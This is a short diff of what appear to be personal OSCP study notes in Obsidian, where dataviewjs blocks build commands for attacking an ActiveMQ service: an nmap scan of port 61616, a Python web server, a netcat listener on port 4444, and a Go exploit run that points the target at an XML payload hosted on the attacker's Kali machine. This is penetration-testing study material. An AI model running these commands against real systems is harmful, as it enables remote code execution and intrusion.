@@ -1,6 +1,6 @@
 nmap scan for activeMQ
 ```dataviewjs
-const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
 
 const command = `sudo nmap -sV -oA script_scan ${ip} -p 61616`;
 
@@ -58,7 +58,7 @@ python3 -m http.server 9001
 nc -lvnp 4444
 ```
 ```dataviewjs
-const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
 const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `go run main.go -i ${ip} -p 61616 -u http://${KaliIP}:4444/poc-linux.xml`;
